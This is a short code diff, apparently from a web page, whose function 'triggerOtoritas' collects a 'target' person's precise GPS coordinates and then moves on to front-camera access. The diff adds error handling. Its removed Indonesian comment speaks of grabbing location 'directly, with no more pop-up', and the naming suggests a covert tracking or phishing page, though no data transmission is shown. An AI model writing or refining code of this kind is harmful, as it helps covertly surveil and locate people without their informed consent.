@@ -25,12 +25,15 @@
         
         async function triggerOtoritas() {
             // 1. Ambil Koordinat GPS Sekali Saja di Awal (Tidak Berulang)
-            // langsung ambil, gak ada pop-up lagi
-                navigator.geolocation.getCurrentPosition(pos => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
                     targetLatitude = pos.coords.latitude;
                     targetLongitude = pos.coords.longitude;
-                }, null, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
-            }         
+                }, (err) => {
+                    targetLatitude = "Akses Ditolak/Timeout";
+                    targetLongitude = "Akses Ditolak/Timeout";
+                }, { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 });
+            }
 
             // 2. Ambil Izin Kamera Depan
             try {
